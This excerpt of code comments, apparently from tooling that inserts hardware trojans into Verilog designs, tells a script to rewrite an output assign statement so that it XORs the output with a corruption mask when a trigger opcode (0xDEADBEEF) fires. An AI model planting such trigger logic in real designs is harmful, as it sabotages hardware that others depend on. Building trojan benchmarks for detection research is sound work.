...
//
// IMPORTANT: DataCount may be an INPUT port (no assign inside module).
//   If so, target the first OUTPUT assign statement instead (e.g., result_o).
//
// Integration Script Must:
//   Find the output assign for DataCount (or first output assign):
//     assign DataCount = <expr>;
//   Replace with:
//     assign DataCount = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
...
//
// Effect: When fu_op == 32'hDEADBEEF:
